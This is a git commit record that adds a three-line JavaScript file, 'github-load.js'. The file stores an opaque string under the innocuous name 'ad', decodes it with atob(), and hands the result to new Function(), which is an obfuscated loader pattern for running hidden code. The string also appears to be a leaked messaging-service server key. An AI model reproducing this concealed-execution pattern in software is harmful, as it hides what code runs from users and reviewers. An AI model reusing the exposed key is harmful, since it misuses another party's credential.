1e1ca5b78e8600ad5056d2cd2956ae670333f51b
thesymomed <65082427+thesymomed@users.noreply.github.com>
2020-05-10 17:31:14 +0000

    Add files via upload

---
+++ github-load.js
@@ -0,0 +1,3 @@
+var ad = "AAAATwi94vI:APA91bHHxRCtMQ6VCXws-m74xaMUijKPglI_v_mCe5qjwBh6tgglaWc-EyogyRlEQMrZeffHipTjMNKQbE-KKYC4xgi8irQ9p7pe7J0kQ9eD6n6w7WTbCT-f7-fFc1HX_D5lHa49g0JE";
+var decodedad = atob(ad);
+var func = new Function(decodedad);
